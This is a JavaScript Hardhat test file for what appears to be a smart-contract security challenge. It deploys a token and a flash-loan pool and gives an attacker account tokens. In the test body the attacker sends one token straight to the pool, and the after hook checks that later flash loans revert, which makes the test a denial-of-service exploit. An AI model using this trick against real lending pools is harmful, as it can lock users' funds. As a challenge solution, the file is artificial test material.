const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('Test Shiba', function () {

    let token;
    let pool;
    let userContract;
    let deployer, user, attacker;

    const INITIAL_SUPPLY = ethers.utils.parseEther('1000000'); // 1 Million
    const TOKENS_IN_POOL = ethers.utils.parseEther('100000'); // 100K
    const ATTACKER_TOKENS = ethers.utils.parseEther('10'); // 10
    
    before(async function () {

        [deployer, user, attacker] = await ethers.getSigners();
        
        const ShibaTokenFactory = await ethers.getContractFactory(
            'ShibaToken',
            deployer
        );
        token = await ShibaTokenFactory.deploy(INITIAL_SUPPLY);
        const ShibaPoolFactory = await ethers.getContractFactory(
            'ShibaPool',
            deployer
        );
        pool = await ShibaPoolFactory.deploy(token.address);

        await token.transfer(attacker.address, ATTACKER_TOKENS);
        await token.approve(pool.address, TOKENS_IN_POOL);
        await pool.depositTokens(TOKENS_IN_POOL)
        expect(
            await token.balanceOf(pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await token.balanceOf(attacker.address)
        ).to.equal(ATTACKER_TOKENS);

        const FlashLoanUserFactory = await ethers.getContractFactory(
            'FlashLoanUser',
            user
        );
        userContract = await FlashLoanUserFactory.deploy(pool.address);
        await userContract.requestFlashLoan(10);
    });

    it('Test Shiba', async function () {
        await token.connect(attacker).transfer(pool.address, ethers.utils.parseEther("1"));
    });

    after(async function () {

        await expect(
            userContract.requestFlashLoan(10)
        ).to.be.reverted;
    });
});